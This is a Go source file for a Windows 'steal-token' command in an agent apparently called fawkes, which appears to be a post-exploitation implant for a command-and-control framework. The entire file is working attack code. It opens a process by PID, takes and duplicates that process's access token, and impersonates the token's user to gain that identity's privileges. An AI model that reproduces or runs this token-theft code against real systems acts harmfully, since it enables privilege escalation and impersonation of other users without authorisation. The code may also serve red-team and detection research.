//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type StealTokenCommand struct{}

func (c *StealTokenCommand) Name() string {
	return "steal-token"
}

func (c *StealTokenCommand) Description() string {
	return "Steal and impersonate a token from another process"
}

type StealTokenParams struct {
	PID int `json:"pid"`
}

// Execute implements Xenon's TokenSteal function from Token.c (lines 106-183)
// and Apollo's GetSystem/StealToken from IdentityManager.cs
func (c *StealTokenCommand) Execute(task structs.Task) structs.CommandResult {
	var params StealTokenParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID == 0 {
		return structs.CommandResult{
			Output:    "PID is required",
			Status:    "error",
			Completed: true,
		}
	}

	// Get current identity before stealing
	oldIdentity, _ := GetCurrentIdentity()

	// Revert any existing impersonation first (Xenon Token.c line 118)
	if err := RevertCurrentToken(); err != nil {
		// Log but continue
	}

	// Open target process with PROCESS_QUERY_INFORMATION
	// Xenon Token.c line 124: OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, Pid)
	// Try PROCESS_QUERY_INFORMATION first, fall back to PROCESS_QUERY_LIMITED_INFORMATION
	hProcess, err := windows.OpenProcess(PROCESS_QUERY_INFORMATION, false, uint32(params.PID))
	if err != nil {
		// Try with limited information access (works on more processes)
		hProcess, err = windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, uint32(params.PID))
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("OpenProcess failed for PID %d: %v (check permissions/SeDebugPrivilege)", params.PID, err),
				Status:    "error",
				Completed: true,
			}
		}
	}
	defer windows.CloseHandle(hProcess)

	// Open process token
	// Xenon Token.c line 129: OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken)
	// Using specific access rights instead of TOKEN_ALL_ACCESS for better compatibility
	var hToken windows.Token

	// Try TOKEN_ALL_ACCESS first (works if we have SeDebugPrivilege or elevated)
	err = windows.OpenProcessToken(hProcess, windows.TOKEN_ALL_ACCESS, &hToken)
	if err != nil {
		// Fall back to specific rights needed for impersonation
		err = windows.OpenProcessToken(hProcess, STEAL_TOKEN_ACCESS, &hToken)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("OpenProcessToken failed for PID %d: %v", params.PID, err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	// Get target identity for output
	targetIdentity, _ := GetTokenUserInfo(hToken)

	// Impersonate using the primary token first (Xenon Token.c line 134-141)
	// This is a direct impersonation of the process token
	ret, _, err := procImpersonateLoggedOnUser.Call(uintptr(hToken))
	if ret == 0 {
		hToken.Close()
		return structs.CommandResult{
			Output:    fmt.Sprintf("ImpersonateLoggedOnUser failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Duplicate the token for storage (Xenon Token.c lines 143-157)
	// DuplicateTokenEx with SecurityDelegation and TokenPrimary
	var duplicatedToken windows.Token
	err = windows.DuplicateTokenEx(
		hToken,
		windows.MAXIMUM_ALLOWED,
		nil, // Security attributes
		windows.SecurityDelegation,
		windows.TokenPrimary,
		&duplicatedToken,
	)
	if err != nil {
		// Try with SecurityImpersonation instead
		err = windows.DuplicateTokenEx(
			hToken,
			windows.MAXIMUM_ALLOWED,
			nil,
			windows.SecurityImpersonation,
			windows.TokenImpersonation,
			&duplicatedToken,
		)
		if err != nil {
			hToken.Close()
			// Revert since we couldn't duplicate
			procRevertToSelf.Call()
			return structs.CommandResult{
				Output:    fmt.Sprintf("DuplicateTokenEx failed: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	// Close original token, we'll use the duplicate
	hToken.Close()

	// Impersonate with the duplicated token (Xenon Token.c lines 159-167)
	ret, _, err = procImpersonateLoggedOnUser.Call(uintptr(duplicatedToken))
	if ret == 0 {
		windows.CloseHandle(windows.Handle(duplicatedToken))
		procRevertToSelf.Call()
		return structs.CommandResult{
			Output:    fmt.Sprintf("ImpersonateLoggedOnUser (duplicated token) failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Store the duplicated token in global state
	tokenMutex.Lock()
	if gIdentityToken != 0 {
		windows.CloseHandle(windows.Handle(gIdentityToken))
	}
	gIdentityToken = duplicatedToken
	tokenMutex.Unlock()

	// Verify impersonation
	newIdentity, err := GetCurrentIdentity()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Token stolen but failed to verify identity: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Format output
	var output string
	if targetIdentity != "" {
		output = fmt.Sprintf("Stole token from PID %d (%s)\n", params.PID, targetIdentity)
	} else {
		output = fmt.Sprintf("Stole token from PID %d\n", params.PID)
	}
	if oldIdentity != "" {
		output += fmt.Sprintf("Old: %s\n", oldIdentity)
	}
	output += fmt.Sprintf("New: %s", newIdentity)

	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}

// ExecuteWithAgent implements the AgentCommand interface
func (c *StealTokenCommand) ExecuteWithAgent(task structs.Task, agent *structs.Agent) structs.CommandResult {
	return c.Execute(task)
}

// Helper to manually open process token with specific access
func openProcessTokenWithAccess(hProcess windows.Handle, access uint32) (windows.Token, error) {
	var token windows.Token
	ret, _, err := procOpenProcessToken.Call(
		uintptr(hProcess),
		uintptr(access),
		uintptr(unsafe.Pointer(&token)),
	)
	if ret == 0 {
		return 0, err
	}
	return token, nil
}
